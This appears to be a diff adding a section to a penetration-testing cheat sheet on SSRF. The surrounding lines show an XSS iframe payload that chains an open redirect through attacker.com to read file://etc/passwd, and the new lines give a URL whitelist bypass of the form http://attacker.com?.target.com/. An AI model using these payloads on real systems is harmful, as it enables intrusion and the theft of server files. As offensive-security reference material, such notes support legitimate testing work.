@@ -121,6 +121,10 @@ And if we found an Open redirect in the same, we can chain it with that XSS that
 
 we can craft our XSS payload with `<iframe src=/api/logout?redirTo=//attacker.com/test.php></iframe>`. Now server renders iframe of its own origin gets redirect to attacker server which redirects to `file://etc/passwd`. 
 
+### Whitelist bypass
+
+If the server puts a whitelist for URLs give a `?` at the end of whitelist URL followed by attacker URL. `url=http://attacker.com?.target.com/` This will bypass if they set `http://*.target`. That **?** will break the whitelist and pings to attacker.com
+
 ## Bypassing restrictions from SSRF
 
 localhost bypass wordlist
